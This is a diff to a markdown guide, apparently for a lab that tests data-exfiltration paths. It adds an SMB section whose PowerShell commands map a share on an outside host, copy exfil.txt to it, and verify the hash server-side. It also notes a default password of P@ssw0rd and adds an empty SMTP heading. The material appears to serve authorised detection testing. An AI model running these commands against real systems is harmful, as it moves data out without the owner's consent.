@@ -15,6 +15,8 @@
   - [HTTP Exfiltration](#http-exfiltration)
   - [ICMP Exfiltration](#icmp-exfiltration)
   - [RDP Exfiltration](#rdp-exfiltration)
+  - [SMB Exfiltration](#smb-exfiltration)
+  - [SMTP Exfiltration](#smtp-exfiltration)
 
 ## Summary
 
@@ -410,3 +412,25 @@ sha256sum /home/rdpuser/Desktop/exfil.txt
 ```
 
 ![Description of the image](images/47.png)
+
+### SMB Exfiltration
+
+Be sure to modify the domain in the `net use x: \\exfil.hulkgosmash.com\share /user:smbuser` statement to match your own then copy the file. As before if not specified as a Terraform parameter the password will be `P@ssw0rd`. 
+
+```powershell
+net use x: \\exfiltracer123.hulkgosmash.com\share /user:smbuser
+copy exfil.txt X:\exfil.txt
+net use x: /d
+```
+
+![Description of the image](images/48.png)
+
+Verify the file hash on the server. 
+
+```bash
+sha256sum /home/smbuser/exfil.txt
+```
+
+![Description of the image](images/49.png)
+
+### SMTP Exfiltration
